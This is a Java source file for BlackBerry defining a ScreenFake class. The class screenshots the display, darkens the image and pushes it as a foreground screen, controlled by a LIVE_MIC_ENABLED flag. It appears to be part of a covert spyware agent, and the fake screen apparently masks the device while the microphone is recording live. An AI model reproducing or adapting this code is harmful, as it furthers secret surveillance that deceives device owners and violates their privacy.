package blackberry;

import net.rim.device.api.system.Application;
import net.rim.device.api.system.Bitmap;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.BitmapField;
import net.rim.device.api.ui.container.MainScreen;
import blackberry.agent.SnapShotAgent;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class ScreenFake extends MainScreen {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ScreenFake", DebugLevel.INFORMATION);
    //#endif
    Bitmap bitmap;
    private static ScreenFake instance;

    public ScreenFake() {
        super();

        bitmap = SnapShotAgent.getScreenshot();
        modifyBitmap();
        final BitmapField field = new BitmapField(bitmap);
        add(field);
    }

    private void modifyBitmap() {
        final int height = bitmap.getHeight();
        final int width = bitmap.getWidth();
        final int[] rgbdata = new int[width * height];
        //Graphics g = new Graphics(bmp);
        bitmap.getARGB(rgbdata, 0, width, 0, 0, width, height);

        for (int i = 0; i < rgbdata.length; i++) {
            rgbdata[i] = (rgbdata[i] >> 4);
        }
        bitmap.setARGB(rgbdata, 0, width, 0, 0, width, height);
    }

    public boolean onClose() {
        return true;
    }

    public static void Push() {
        if (!Conf.IS_UI) {
            //#ifdef DEBUG
            debug.warn("Not UI");
            //#endif
            return;
        }

        instance = new ScreenFake();
        synchronized (Application.getEventLock()) {
            //#ifdef LIVE_MIC_ENABLED
            UiApplication.getUiApplication().requestForeground();
            UiApplication.getUiApplication().pushScreen(instance);
            UiApplication.getUiApplication().repaint();
            //#endif

        }

    }

    public static void Pop() {
        if (!Conf.IS_UI) {
            //#ifdef DEBUG
            debug.warn("Not UI");
            //#endif
            return;
        }

        if (instance != null) {
            //#ifdef LIVE_MIC_ENABLED 
            synchronized (Application.getEventLock()) {
                UiApplication.getUiApplication().popScreen(instance);
            }
            //#endif
        }

        instance = null;
    }
}
